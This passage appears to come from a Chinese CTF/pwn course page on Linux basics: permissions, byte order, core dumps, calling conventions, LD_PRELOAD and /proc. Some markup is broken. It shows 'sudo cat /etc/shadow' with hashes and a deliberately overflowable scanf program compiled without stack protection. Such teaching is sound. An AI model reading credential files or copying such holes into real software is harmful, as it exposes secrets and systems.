Group ID(GID)，UID  是对一个用户的单一身份标识，而 GID 则对应多个 UID。知道某个用户的 UID 和 GID 是非常有用的，一些程序可能就需要 UID/GID 来运行。可以使用 <code>id</code> 命令来查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ id root</span><br><span class=\"line\">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)</span><br><span class=\"line\">$ id firmy</span><br><span class=\"line\">uid=1000(firmy) gid=1000(firmy) groups=1000(firmy),3(sys),7(lp),10(wheel),90(network),91(video),93(optical),95(storage),96(scanner),98(power),56(bumblebee)</span><br></pre></td></tr></table></figure>\n\n<p>UID 为 0 的 root 用户类似于系统管理员，它具有系统的完全访问权。我自己新建的用户 firmy，其 UID 为 1000，是一个普通用户。GID 的关系存储在 <code>/etc/group</code> 文件中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat /etc/group</span><br><span class=\"line\">root:x:0:root</span><br><span class=\"line\">bin:x:1:root,bin,daemon</span><br><span class=\"line\">daemon:x:2:root,bin,daemon</span><br><span class=\"line\">sys:x:3:root,bin,firmy</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>所有用户的信息（除了密码）都保存在 <code>/etc/passwd</code> 文件中，而为了安全起见，加密过的用户密码保存在 <code>/etc/shadow</code> 文件中，此文件只有 root 权限可以访问。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo cat /etc/shadow</span><br><span class=\"line\">root:$6$root$wvK.pRXFEH80GYkpiu1tEWYMOueo4tZtq7mYnldiyJBZDMe.mKwt.WIJnehb4bhZchL/93Oe1ok9UwxYf79yR1:17264::::::</span><br><span class=\"line\">firmy:$6$firmy$dhGT.WP91lnpG5/10GfGdj5L1fFVSoYlxwYHQn.llc5eKOvr7J8nqqGdVFKykMUSDNxix5Vh8zbXIapt0oPd8.:17264:0:99999:7:::</span><br></pre></td></tr></table></figure>\n\n<p>由于普通用户的权限比较低，这里使用 <code>sudo</code> 命令可以让普通用户以 root 用户的身份运行某一命令。使用 <code>su</code> 命令则可以切换到一个不同的用户：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ whoami</span><br><span class=\"line\">firmy</span><br><span class=\"line\">$ su root</span><br><span class=\"line\"># whoami</span><br><span class=\"line\">root</span><br></pre></td></tr></table></figure>\n\n<p><code>whoami</code> 用于打印当前有效的用户名称，shell 中普通用户以 <code>$</code> 开头，root 用户以 <code>#</code> 开头。在输入密码后，我们已经从 firmy 用户转换到 root 用户了。</p>\n<h2 id=\"权限设置\"><a href=\"#权限设置\" class=\"headerlink\" title=\"权限设置\"></a>权限设置</h2><p>在Linux 中，文件或目录权限的控制分别以读取、写入、执行 3 种一般权限来区分，另有 3 种特殊权限可供运用。</p>\n<p>使用 <code>ls -l [file]</code> 来查看某文件或目录的信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ls -l /</span><br><span class=\"line\">lrwxrwxrwx   1 root root     7 Jun 21 22:44 bin -&gt; usr/bin</span><br><span class=\"line\">drwxr-xr-x   4 root root  4096 Jul 28 08:48 boot</span><br><span class=\"line\">-rw-r--r--   1 root root 18561 Apr  2 22:48 desktopfs-pkgs.txt</span><br></pre></td></tr></table></figure>\n\n<p>第一栏从第二个字母开始就是权限字符串，权限表示三个为一组，依次是所有者权限、组权限、其他人权限。每组的顺序均为 <code>rwx</code>，如果有相应权限，则表示成相应字母，如果不具有相应权限，则用 <code>-</code> 表示。 - <code>r</code>：读取权限，数字代号为 “4” - <code>w</code>：写入权限，数字代号为 “2” - <code>x</code>：执行或切换权限，数字代号为 “1”</p>\n<p>通过第一栏的第一个字母可知，第一行是一个链接文件 （<code>l</code>），第二行是个目录（<code>d</code>），第三行是个普通文件（<code>-</code>）。</p>\n<p>用户可以使用 <code>chmod</code> 指令去变更文件与目录的权限。权限范围被指定为所有者（<code>u</code>）、所属组（<code>g</code>）、其他人（<code>o</code>）和所有人（<code>a</code>）。 - -R：递归处理，将指令目录下的所有文件及子目录一并处理； - &lt;权限范围&gt;+&lt;权限设置&gt;：开启权限范围的文件或目录的该选项权限设置 - <code>$ chmod a+r [file]</code>：赋予所有用户读取权限 - &lt;权限范围&gt;-&lt;权限设置&gt;：关闭权限范围的文件或目录的该选项权限设置 - <code>$ chmod u-w [file]</code>：取消所有者写入权限 - &lt;权限范围&gt;=&lt;权限设置&gt;：指定权限范围的文件或目录的该选项权限设置； - <code>$ chmod g=x [file]</code>：指定组权限为可执行 - <code>$ chmod o=rwx [file]</code>：制定其他人权限为可读、可写和可执行</p>\n<p><img src=\"http://study.ctfcaict.com/media/course/html/3/site/linux/pic/1.3_file.png\" alt=\"img\"></p>\n<h2 id=\"字节序\"><a href=\"#字节序\" class=\"headerlink\" title=\"字节序\"></a>字节序</h2><p>目前计算机中采用两种字节存储机制：大端（Big-endian）和小端（Little-endian）。</p>\n<blockquote>\n<p>MSB (Most Significan Bit/Byte)：最重要的位或最重要的字节。</p>\n<p>LSB (Least Significan Bit/Byte)：最不重要的位或最不重要的字节。</p>\n</blockquote>\n<p>Big-endian 规定 MSB 在存储时放在低地址，在传输时放在流的开始；LSB  存储时放在高地址，在传输时放在流的末尾。Little-endian 则相反。常见的 Intel 处理器使用 Little-endian，而  PowerPC 系列处理器则使用 Big-endian，另外 TCP/IP 协议和 Java 虚拟机的字节序也是 Big-endian。</p>\n<p>例如十六进制整数 0x12345678 存入以 1000H 开始的内存中：</p>\n<p><img src=\"http://study.ctfcaict.com/media/course/html/3/site/linux/pic/1.3_byte_order.png\" alt=\"img\"></p>\n<p>我们在内存中实际地看一下，在地址 <code>0xffffd584</code> 处有字符 <code>1234</code>，在地址 <code>0xffffd588</code> 处有字符 <code>5678</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ x/w 0xffffd584</span><br><span class=\"line\">0xffffd584:     0x34333231</span><br><span class=\"line\">gdb-peda$ x/4wb 0xffffd584</span><br><span class=\"line\">0xffffd584:     0x31    0x32    0x33    0x34</span><br><span class=\"line\">gdb-peda$ python print(&#x27;\\x31\\x32\\x33\\x34&#x27;)</span><br><span class=\"line\">1234</span><br><span class=\"line\"></span><br><span class=\"line\">gdb-peda$ x/w 0xffffd588</span><br><span class=\"line\">0xffffd588:     0x38373635</span><br><span class=\"line\">gdb-peda$ x/4wb 0xffffd588</span><br><span class=\"line\">0xffffd588:     0x35    0x36    0x37    0x38</span><br><span class=\"line\">gdb-peda$ python print(&#x27;\\x35\\x36\\x37\\x38&#x27;)</span><br><span class=\"line\">5678</span><br><span class=\"line\"></span><br><span class=\"line\">gdb-peda$ x/2w 0xffffd584</span><br><span class=\"line\">0xffffd584:     0x34333231      0x38373635</span><br><span class=\"line\">gdb-peda$ x/8wb 0xffffd584</span><br><span class=\"line\">0xffffd584:     0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38</span><br><span class=\"line\">gdb-peda$ python print(&#x27;\\x31\\x32\\x33\\x34\\x35\\x35\\x36\\x37\\x38&#x27;)</span><br><span class=\"line\">123455678</span><br><span class=\"line\">db-peda$ x/s 0xffffd584</span><br><span class=\"line\">0xffffd584:     &quot;12345678&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"输入输出\"><a href=\"#输入输出\" class=\"headerlink\" title=\"输入输出\"></a>输入输出</h2><ul>\n<li>使用命令的输出作为可执行文件的输入参数</li>\n<li><code>$ ./vulnerable &#39;your_command_here&#39;</code></li>\n<li><code>$ ./vulnerable $(your_command_here)</code></li>\n<li>使用命令作为输入</li>\n<li><code>$ your_command_here | ./vulnerable</code></li>\n<li>将命令行输出写入文件</li>\n<li><code>$ your_command_here &gt; filename</code></li>\n<li>使用文件作为输入</li>\n<li><code>$ ./vulnerable &lt; filename</code></li>\n</ul>\n<h2 id=\"文件描述符\"><a href=\"#文件描述符\" class=\"headerlink\" title=\"文件描述符\"></a>文件描述符</h2><p>在 Linux 系统中一切皆可以看成是文件，文件又分为：普通文件、目录文件、链接文件和设备文件。文件描述符（file descriptor）是内核管理已被打开的文件所创建的索引，使用一个非负整数来指代被打开的文件。</p>\n<p>标准文件描述符如下：</p>\n<table>\n<thead>\n<tr>\n<th>文件描述符</th>\n<th>用途</th>\n<th>stdio 流</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>标准输入</td>\n<td>stdin</td>\n</tr>\n<tr>\n<td>1</td>\n<td>标准输出</td>\n<td>stdout</td>\n</tr>\n<tr>\n<td>2</td>\n<td>标准错误</td>\n<td>stderr</td>\n</tr>\n</tbody></table>\n<p>当一个程序使用 <code>fork()</code> 生成一个子进程后，子进程会继承父进程所打开的文件表，此时，父子进程使用同一个文件表，这可能导致一些安全问题。如果使用 <code>vfork()</code>，子进程虽然运行于父进程的空间，但拥有自己的进程表项。</p>\n<h2 id=\"核心转储\"><a href=\"#核心转储\" class=\"headerlink\" title=\"核心转储\"></a>核心转储</h2><p>当程序运行的过程中异常终止或崩溃，操作系统会将程序当时的内存、寄存器状态、堆栈指针、内存管理信息等记录下来，保存在一个文件中，这种行为就叫做核心转储（Core Dump）。</p>\n<h4 id=\"会产生核心转储的信号\"><a href=\"#会产生核心转储的信号\" class=\"headerlink\" title=\"会产生核心转储的信号\"></a>会产生核心转储的信号</h4><table>\n<thead>\n<tr>\n<th>Signal</th>\n<th>Action</th>\n<th>Comment</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>SIGQUIT</td>\n<td>Core</td>\n<td>Quit from keyboard</td>\n</tr>\n<tr>\n<td>SIGILL</td>\n<td>Core</td>\n<td>Illegal Instruction</td>\n</tr>\n<tr>\n<td>SIGABRT</td>\n<td>Core</td>\n<td>Abort signal from abort</td>\n</tr>\n<tr>\n<td>SIGSEGV</td>\n<td>Core</td>\n<td>Invalid memory reference</td>\n</tr>\n<tr>\n<td>SIGTRAP</td>\n<td>Core</td>\n<td>Trace/breakpoint trap</td>\n</tr>\n</tbody></table>\n<h4 id=\"开启核心转储\"><a href=\"#开启核心转储\" class=\"headerlink\" title=\"开启核心转储\"></a>开启核心转储</h4><ul>\n<li><p>输入命令 <code>ulimit -c</code>，输出结果为 <code>0</code>，说明默认是关闭的。</p>\n</li>\n<li><p>输入命令 <code>ulimit -c unlimited</code> 即可在当前终端开启核心转储功能。</p>\n</li>\n<li><p>如果想让核心转储功能永久开启，可以修改文件 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/security/limits.conf</span><br></pre></td></tr></table></figure>\n\n<p>，增加一行：  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#&lt;domain&gt;      &lt;type&gt;  &lt;item&gt;         &lt;value&gt;</span><br><span class=\"line\">*               soft    core            unlimited</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h4 id=\"修改转储文件保存路径\"><a href=\"#修改转储文件保存路径\" class=\"headerlink\" title=\"修改转储文件保存路径\"></a>修改转储文件保存路径</h4><ul>\n<li>```<br>/proc/sys/kernel/core_uses_pid<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">，可以使生成的核心转储文件名变为 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\ncore.[pid]<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">的模式。  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"echo-1-gt-proc-sys-kernel-core-uses-pid\"><a href=\"#echo-1-gt-proc-sys-kernel-core-uses-pid\" class=\"headerlink\" title=\"echo 1 &gt; /proc/sys/kernel/core_uses_pid\"></a>echo 1 &gt; /proc/sys/kernel/core_uses_pid</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">- 还可以修改 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n/proc/sys/kernel/core_pattern<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">来控制生成核心转储文件的保存位置和文件名格式。  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"echo-tmp-core-e-p-t-gt-proc-sys-kernel-core-pattern\"><a href=\"#echo-tmp-core-e-p-t-gt-proc-sys-kernel-core-pattern\" class=\"headerlink\" title=\"echo /tmp/core-%e-%p-%t &gt; /proc/sys/kernel/core_pattern\"></a>echo /tmp/core-%e-%p-%t &gt; /proc/sys/kernel/core_pattern</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">此时生成的文件保存在 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n/tmp/<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">目录下，文件名格式为 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\ncore-[filename]-[pid]-[time]<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#### 使用 gdb 调试核心转储文件</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ gdb [filename] [core file]<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#### 例子</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ cat core.c<br>#include &lt;stdio.h&gt;<br>void main(int argc, char **argv) {<br>  char buf[5];<br>  scanf(“%s”, buf);<br>}<br>$ gcc -m32 -fno-stack-protector core.c<br>$ ./a.out<br>AAAAAAAAAAAAAAAAAAAA<br>Segmentation fault (core dumped)<br>$ file /tmp/core-a.out-12444-1503198911<br>/tmp/core-a.out-12444-1503198911: ELF 32-bit LSB core file Intel 80386, version 1 (SYSV), SVR4-style, from ‘./a.out’, real uid: 1000, effective uid: 1000, real gid: 1000, effective gid: 1000, execfn: ‘./a.out’, platform: ‘i686’<br>$ gdb a.out /tmp/core-a.out-12444-1503198911 -q<br>Reading symbols from a.out…(no debugging symbols found)…done.<br>[New LWP 12444]<br>Core was generated by `./a.out’.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br>#0  0x5655559b in main ()<br>gdb-peda$ info frame<br>Stack level 0, frame at 0x41414141:<br>eip = 0x5655559b in main; saved eip = <not saved><br>Outermost frame: Cannot access memory at address 0x4141413d<br>Arglist at 0x41414141, args:<br>Locals at 0x41414141, Previous frame’s sp is 0x41414141<br>Cannot access memory at address 0x4141413d<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## 调用约定</span><br><span class=\"line\"></span><br><span class=\"line\">函数调用约定是对函数调用时如何传递参数的一种约定。关于它的约定有许多种，下面我们分别从内核接口和用户接口介绍 32 位和 64 位 Linux 的调用约定。</span><br><span class=\"line\"></span><br><span class=\"line\">#### 内核接口</span><br><span class=\"line\"></span><br><span class=\"line\">**x86-32 系统调用约定**：Linux 系统调用使用寄存器传递参数。`eax` 为 syscall_number，`ebx`、`ecx`、`edx`、`esi`、`ebp` 用于将 6 个参数传递给系统调用。返回值保存在 `eax` 中。所有其他寄存器（包括 EFLAGS）都保留在 `int 0x80` 中。</span><br><span class=\"line\"></span><br><span class=\"line\">**x86-64 系统调用约定**：内核接口使用的寄存器有：`rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9`。系统调用通过 `syscall` 指令完成。除了 `rcx`、`r11` 和 `rax`，其他的寄存器都被保留。系统调用的编号必须在寄存器 `rax` 中传递。系统调用的参数限制为 6 个，不直接从堆栈上传递任何参数。返回时，`rax` 中包含了系统调用的结果。而且只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。</span><br><span class=\"line\"></span><br><span class=\"line\">#### 用户接口</span><br><span class=\"line\"></span><br><span class=\"line\">**x86-32 函数调用约定**：参数通过栈进行传递。最后一个参数第一个被放入栈中，直到所有的参数都放置完毕，然后执行 call 指令。这也是 Linux 上 C 语言函数的方式。</span><br><span class=\"line\"></span><br><span class=\"line\">**x86-64 函数调用约定**：x86-64 下通过寄存器传递参数，这样做比通过栈有更高的效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数的类型是 MEMORY，则在栈上传递参数。如果类型是 INTEGER，则顺序使用 `rdi`、`rsi`、`rdx`、`rcx`、`r8` 和 `r9`。所以如果有多于 6 个的 INTEGER 参数，则后面的参数在栈上传递。</span><br><span class=\"line\"></span><br><span class=\"line\">## 环境变量</span><br><span class=\"line\"></span><br><span class=\"line\">- 按照生命周期划分</span><br><span class=\"line\">- 永久环境变量：修改相关配置文件，永久生效。</span><br><span class=\"line\">- 临时环境变量：使用 `export` 命令，在当前终端下生效，关闭终端后失效。</span><br><span class=\"line\">- 按照作用域划分</span><br><span class=\"line\">- 系统环境变量：对该系统中所有用户生效。</span><br><span class=\"line\">- 用户环境变量：对特定用户生效。</span><br><span class=\"line\"></span><br><span class=\"line\">#### 设置方法</span><br><span class=\"line\"></span><br><span class=\"line\">1. 在文件 `/etc/profile` 中添加变量，这种方法对所有用户永久生效。如：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"Set-our-default-path\"><a href=\"#Set-our-default-path\" class=\"headerlink\" title=\"Set our default path\"></a>Set our default path</h1> PATH=”/usr/local/sbin:/usr/local/bin:/usr/bin”<br> export PATH <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">添加后执行命令 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n source /etc/profile <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    使其生效。</span><br><span class=\"line\"></span><br><span class=\"line\">   </span><br><span class=\"line\"></span><br><span class=\"line\">2. 在文件 `~/.bash_profile` 中添加变量，这种方法对当前用户永久生效。其余同上。</span><br><span class=\"line\"></span><br><span class=\"line\">3. 直接运行命令 `export` 定义变量，这种方法只对当前终端临时生效。</span><br><span class=\"line\"></span><br><span class=\"line\">#### 常用变量</span><br><span class=\"line\"></span><br><span class=\"line\">使用命令 `echo` 打印变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ echo $PATH<br>/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl<br>$ echo $HOME<br>/home/firmy<br>$ echo $LOGNAME<br>firmy<br>$ echo $HOSTNAME<br>firmy-pc<br>$ echo $SHELL<br>/bin/bash<br>$ echo $LANG<br>en_US.UTF-8<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">使用命令 `env` 可以打印出所有环境变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ env<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">使用命令 `set` 可以打印处所有本地定义的 shell 变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ set<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">使用命令 `unset` 可以清楚环境变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ unset $变量名<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### LD_PRELOAD</span><br><span class=\"line\"></span><br><span class=\"line\">该环境变量可以定义在程序运行前优先加载的动态链接库。在 pwn 题目中，我们可能需要一个特定的 libc，这时就可以定义该变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ LD_PRELOAD=/path/to/libc.so ./binary<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">一个例子：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ ldd /bin/true<br>  linux-vdso.so.1 =&gt;  (0x00007fff9a9fe000)<br>  libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1c083d9000)<br>  /lib64/ld-linux-x86-64.so.2 (0x0000557bcce6c000)<br>$ LD_PRELOAD=~/libc.so.6 ldd /bin/true<br>  linux-vdso.so.1 =&gt;  (0x00007ffee55e9000)<br>  /home/firmy/libc.so.6 (0x00007f4a28cfc000)<br>  /lib64/ld-linux-x86-64.so.2 (0x000055f33bc50000)<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">注意，这种方法得根据实际情况来用，大概就是使用的发行版要相同（`interpreter` 相同），上面的例子中两个 libc 是这样的：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ file /lib/x86_64-linux-gnu/libc-2.23.so<br>/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped<br>$ file ~/libc.so.6<br>/home/firmy/libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">都是 `interpreter /lib64/ld-linux-x86-64.so.2`，所以可以替换。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">而下面的例子是在 Arch Linux 上使用一个 Ubuntu 的 libc，就会出错：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ ldd /bin/true<pre><code>  linux-vdso.so.1 (0x00007ffc969df000)\n  libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f7ddde17000)\n  /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f7dde3d7000)\n</code></pre>\n$ LD_PRELOAD=~/libc.so.6 ldd /bin/true<br>Illegal instruction (core dumped)<br>$ file /usr/lib/libc-2.26.so<br>/usr/lib/libc-2.26.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /usr/lib/ld-linux-x86-64.so.2, BuildID[sha1]=458fd9997a454786f071cfe2beb234542c1e871f, for GNU/Linux 3.2.0, not stripped<br>$ file ~/libc.so.6<br>/home/firmy/libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">一个在 `interpreter /usr/lib/ld-linux-x86-64.so.2`，而另一个在 `interpreter /lib64/ld-linux-x86-64.so.2`。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">## /proc/pid</span><br><span class=\"line\"></span><br><span class=\"line\">proc 文件系统是 Linux 内核提供的，为访问系统内核数据的操作提供接口。在该文件系统下，有一些以数字命名的目录，这些数字是进程的 PID 号，而这些目录是进程目录。</span><br><span class=\"line\"></span><br><span class=\"line\">目录下的所有文件如下，然后会介绍几个比较重要的：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ cat - &amp;<br>[1] 2865<br>$ ls /proc/2865/<br>attr             cpuset   limits      ns             root          statm<br>autogroup        cwd      map_files   numa_maps      sched         status<br>auxv             environ  maps        oom_adj        schedstat     syscall<br>cgroup           exe      mem         oom_score      setgroups     task<br>clear_refs       fd       mountinfo   oom_score_adj  smaps         timers<br>cmdline          fdinfo   mounts      pagemap        smaps_rollup  